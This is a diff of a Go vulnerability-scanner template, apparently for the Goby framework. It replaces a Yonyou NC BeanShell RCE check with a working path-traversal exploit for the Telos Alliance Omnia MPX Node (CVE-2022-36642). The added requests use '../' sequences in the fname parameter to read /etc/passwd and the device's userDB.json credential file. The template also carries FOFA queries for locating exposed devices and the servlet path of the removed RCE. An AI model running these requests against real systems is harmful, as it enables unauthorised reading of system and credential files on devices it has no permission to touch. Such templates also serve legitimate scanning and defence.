@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Telos Alliance Omnia MPX Node信息泄露漏洞(CVE-2022-36642)",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Omnia-MPX-Node\" || product=\"Omnia-MPX-Node\"",
+  "GobyQuery": "app=\"Omnia-MPX-Node\" || product=\"Omnia-MPX-Node\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -26,11 +26,11 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "mustChangePwd",
             "bz": ""
           }
         ]
@@ -107,7 +138,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Telos Alliance Omnia MPX Node信息泄露漏洞(CVE-2022-36642)",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Telos Alliance Omnia MPX Node Information disclosure CVE-2022-36642 ",
       "Product": "",
       "Description": "",
       "Recommendation": "",
